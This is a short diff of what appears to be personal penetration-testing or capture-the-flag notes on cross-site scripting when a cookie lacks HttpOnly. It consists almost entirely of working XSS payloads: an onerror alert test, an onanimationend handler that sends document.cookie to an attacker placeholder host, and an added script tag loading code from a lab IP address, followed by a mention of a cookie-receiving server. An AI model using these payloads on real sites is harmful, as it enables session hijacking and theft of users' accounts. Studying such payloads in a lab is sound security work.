@@ -7,6 +7,9 @@ If HttpOnly is of:
 "><img src=x onerror=alert(1)>
 
 <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
+
+	
+<script src="http://10.10.14.204:8888/?test=1" />
 ```
 
 Server for recieving cookies:
